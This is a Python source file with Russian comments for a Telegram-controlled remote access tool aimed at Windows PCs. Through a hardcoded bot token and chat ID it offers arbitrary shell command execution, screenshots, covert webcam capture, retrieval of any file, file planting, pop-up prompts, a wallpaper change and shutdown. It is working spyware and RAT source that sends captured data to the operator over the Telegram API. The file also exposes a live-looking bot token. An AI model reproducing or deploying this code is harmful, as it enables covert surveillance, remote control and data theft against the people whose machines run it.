import telebot						#создания и управления телеграм-бота
from telebot import types			#для работы с клавиатурами и другими элементами
import time							#для работы со временем и задержками.

import tempfile						#получение пути к временной директории
from PIL import ImageGrab			#захват изображений с экрана компьютера.
import cv2							#доступ к камере
import requests             		#доступ к ip адресу
import ctypes               		#изменение фона рабочего стола 
import pyautogui as pag     		#доступ к сообщениям на экране
import platform as pf       		#доступ к характеристикам
import os                  		 	#доступ к пути файла
import shutil, pyautogui, psutil	#доступ к памяти и к разрешению экрана
from datetime import datetime		#доступ к времени запуска

TOKEN = "6154235393:AAEWvLblp74CZ4RFvfRr-iNnxLQOhf6vfMo"
bot = telebot.TeleBot(TOKEN)#токен бота
CHAT_ID = 1216109998 #id аккаунта
 
#POST-запрос к API Telegram для проверки работоспособности
requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Online")

@bot.message_handler(commands=["start"]) #обработчик сообщения START
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True) #Разметка клавиатуры для ответа
    btns = ["/cmd", "/ip", "/spec", "/screenshot", "/webcam",     #Кнопки 
            "/message", "/input", "/wallpaper", "/upload", "/download", "/shutdown", "/restart" ]
    for btn in btns:    								  #перебор кнопок и добавление в клавиатуру
        rmk.add(types.KeyboardButton(btn))
    time = datetime.now().strftime("%Y-%m-%d / %H:%M:%S")
    login = os.getlogin()
    bot.send_message(message.chat.id, f"👋 Здравствуйте {login}\n 🕓 Точное время запуска: {time} \n 🪄 Выбeрите действие:", reply_markup=rmk)

@bot.message_handler(commands=["cmd"])
def cmd(message):
	if message.chat.id == CHAT_ID:
		bot.send_message(CHAT_ID, "Укажите консольную команду: ")
		bot.register_next_step_handler(message, cmd_process)
def cmd_process (message):
	MAX_MESSAGE_LENGTH = 3500  # Максимальная длина сообщения Telegram
	try:
		command = message.text
		stream = os.popen(command) # Выполнение команды в о.с.
		output_bytes = stream.read() # Чтение вывода в виде байтовых данных
		output = output_bytes.encode('cp1251').decode('cp866') # Преобразование кодировки байтового вывода 
		if len(output) > MAX_MESSAGE_LENGTH:				# Сокращение сообщения, если оно превышает максимальную длину
			output = output[:MAX_MESSAGE_LENGTH] + "..."
		bot.send_message(message.chat.id, f"Результат выполнения команды:\n{output}")
	except Exception as e:									# исключение при возникновении любой необработанной ошибки
		bot.send_message(message.chat.id, f"Ошибка! Произошла ошибка: {str(e)}")

@bot.message_handler(commands=["ip", "ip_address"]) #обработчик сообщения ip
def ip_address(message):
	if message.chat.id == CHAT_ID:
		# Получаем данные об IP-адресе с помощью API 
		response = requests.get("https://jsonip.com/").json()
		# Отправляем сообщение с IP-адресом боту
		bot.send_message(message.chat.id, f"🌍IP Address: {response['ip']}")

@bot.message_handler(commands=["spec", "specifications"])  #обработчик сообщения spec
def spec(message):
	if message.chat.id == CHAT_ID:

		name = pf.node()										#Получение имени устройства.
		proc = pf.processor()									#Получение информации о процессоре.
		system = f'{pf.system()} {pf.release()}'				#Получение информации об операционной системе.
		total_mem, used_mem, free_mem = shutil.disk_usage('.')	#Получение информации о использовании дискового пространства для диска C:.
		gb = 10 ** 9											#Коэффициент для преобразования байтов в гигабайты.
		width, height = pyautogui.size()
		virtual_memory = psutil.virtual_memory()
		battery = psutil.sensors_battery()
		disk_memory = f'Всего ' + '{:6.2f} ГБ'.format(total_mem/gb) + " | Свободно {:6.2f} ГБ".format(free_mem/gb) + f'' 
		#вывод числа с двумя знаками после запятой и шириной поля 6 символов.
		msg = f'''💻 Имя PC - {name}\n
*	Процессор - {proc}\n
*	Операционная система - {system}\n
*	Память диска /C - {disk_memory}\n
*	Оперативная память - Доступно {int(virtual_memory[0] / 1e+9)} ГБ | Загружено {virtual_memory[2]}%\n
*	Батарея - {battery}%\n 
*	Разрешение экрана - {width}x{height}'''
		bot.send_message(message.chat.id, msg)

@bot.message_handler(commands=["screenshot"])  #обработчик сообщения screenshot
def echo_message(message):
	if message.chat.id == CHAT_ID:    
		# Получение пути к временной директории и формирование пути к файлу скриншота
		path = tempfile.gettempdir() + 'screenshot.png'
		# Захват скриншота с помощью ImageGrab
		screenshot = ImageGrab.grab()
		# Сохранение скриншота в формате PNG по указанному пути
		screenshot.save(path, 'PNG')
		# Отправка скриншота в виде фото пользователю через бота
		bot.send_photo(message.chat.id, open(path, 'rb'))

@bot.message_handler(commands=["webcam"])	# обработчик сообщения webcam
def webcam(message):
	if message.chat.id == CHAT_ID:    
		filename = "cam.jpg"
		try: 
			# Открываем камеру
			cap = cv2.VideoCapture(0)
			# Пропускаем первые 30 кадров для стабилизации изображения
			for i in range(30):
				cap.read()
			# Снимаем кадр
			ret, frame = cap.read()
			frame = cv2.flip(frame, -1)
			# Сохраняем кадр в файл
			cv2.imwrite(filename, frame)
			cap.release()
			# Отправляем фотографию
			with open(filename, "rb") as img:
				bot.send_photo(message.chat.id, img)
			# Удаляем временный файл
			os.remove(filename)
		except Exception:	# Обработка исключения
			bot.send_message(message.chat.id, "Камера не подключена")

@bot.message_handler(commands=["message"])   # обработчик команды message
def message_sending(message):                # отправить сообщение клиенту
	if message.chat.id == CHAT_ID:    
		msg = bot.send_message(message.chat.id, "Введите сообщение:")
		bot.register_next_step_handler(msg, next_message_sending)
def next_message_sending(message):
	if message.chat.id == CHAT_ID:    
		try:                                     # делать 
			pag.alert(message.text, "Message")	 # отображения всплывающего сообщения с заголовком Message
		except Exception:                        # кроме исключения
			bot.send_message(message.chat.id, "Что-то пошло не так...")

@bot.message_handler(commands=["input"])     #обработчик сообщения input
def message_sending_with_input(message):     # отправить сообщение с вводом
	if message.chat.id == CHAT_ID:    
		msg = bot.send_message(message.chat.id, "Введите сообщение:")
		bot.register_next_step_handler(msg, next_message_sending_with_input)
def next_message_sending_with_input(message):
	if message.chat.id == CHAT_ID:    
		try:                                     # делать 
			answer = pag.prompt(message.text, "Message")
			bot.send_message(message.chat.id, answer)
		except Exception:                        # кроме исключения
			bot.send_message(message.chat.id, "Что-то пошло не так...")
                                                 
@bot.message_handler(commands=["wallpaper"])	   # обработчик сообщения wallpaper											
def wallpaper(message):
	if message.chat.id == CHAT_ID:    
		msg = bot.send_message(message.chat.id, "Отправьте картинку:")
		bot.register_next_step_handler(msg, set_wallpaper)
@bot.message_handler(content_types=["photo"])			# обработчик фотографии
def set_wallpaper(message):
	if message.chat.id == CHAT_ID:    
		file = message.photo[-1].file_id  # извлекается идентификатор файла
		file = bot.get_file(file)	  # получение информации о файле
		download_file = bot.download_file(file.file_path) # загрузка файла с указанным путем
		with open("image.jpg", "wb") as img:	# открывается файл в режиме записи двоичных данных
			img.write(download_file) #запись байтовых данных содержимого загруженного файла в открытый файл img
		path = os.path.abspath("image.jpg") # Получение полного пути к файлу изображения
		# Установка изображения в качестве обоев рабочего стола
		ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

@bot.message_handler(commands=["upload"])			# обработчик команды upload
def upload(message):
	if message.chat.id == CHAT_ID:
		bot.send_message(message.chat.id, "Пожалуйста, отправьте файл для загрузки")
		bot.register_next_step_handler(message, uploadfile)
def uploadfile(message):
	try:
		file_info = bot.get_file(message.document.file_id)  # Получаем информацию о файле
		downloaded_file = bot.download_file(file_info.file_path) # Скачиваем файл
		src = message.document.file_name	# Определяем имя файла
		with open(src, 'wb') as new_file:	# Записываем файл на диск
			new_file.write(downloaded_file)	# записываем переданные данные в файл.
		bot.send_message(message.chat.id, "Файл успешно загружен")
	except:
		bot.send_message(message.chat.id, "Ошибка! Отправьте файл как документ")

@bot.message_handler(commands=["download"])			# обработчик команды download
def download(message):
	if message.chat.id == CHAT_ID:
		bot.send_message(message.chat.id, "Пожалуйста, укажите путь для отправки документа")
		bot.register_next_step_handler(message, downloadfile)
def downloadfile(message):
	try:
		file_path = message.text # Получение пути файла из сообщения пользователя
		if os.path.exists(file_path): # Проверка, существует ли файл по указанному пути
			bot.send_message(message.chat.id, "Файл загружается, подождите...")
			file_doc = open(file_path, 'rb') # Открытие файла для чтения в режиме бинарного чтения
			bot.send_document(message.chat.id, file_doc) # Отправка документа пользователю
		else:
			bot.send_message(message.chat.id, "Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
	except:
		bot.send_message(message.chat.id, "Ошибка! Что-то пошло не так при загрузке файла")

@bot.message_handler(commands=["shutdown"]) # обработчик сообщения shutdown
def shutdown_computer(message):
	if message.chat.id == CHAT_ID:
		os.system("shutdown /s /t 10")# выключаем с задержкой в 10 секунд
		bot.send_message(message.chat.id, 'Компьютер будет выключен через 10 секунд :)')


@bot.message_handler(commands=["restart"]) # обработчик сообщения restart
def restart_computer(message):
	if message.chat.id == CHAT_ID:    
		# перезапуск с задержкой в 10 секунд
		os.system("shutdown /r /t 10") 
		bot.send_message(message.chat.id, 'Компьютер будет перезагружен через 10 секунд :)')


#Запуск процесса прослушивания событий и обновлений от Telegram
while True:
    try:                                #добавляем try для бесперебойной работы
        bot.polling(none_stop=True)     #запуск бота
    except:
        time.sleep(1)                   #в случае падения